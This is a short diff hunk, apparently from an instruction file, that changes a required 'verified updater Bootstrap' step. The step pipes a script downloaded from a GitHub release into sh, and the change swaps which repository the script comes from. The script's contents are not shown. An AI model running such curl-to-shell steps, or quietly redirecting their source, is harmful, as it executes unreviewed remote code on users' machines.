@@ -33,5 +33,5 @@ scopes separate and never expose credentials in commands, logs, or replies.
 Start every update review through the verified updater Bootstrap:
 
 ```sh
-curl -fsSL https://github.com/LoveMaker-art/liveware-tavern/releases/latest/download/install-tavern-updater.sh | sh
+curl -fsSL https://github.com/LoveMaker-art/noras-tavern/releases/latest/download/install-tavern-updater.sh | sh
 ```
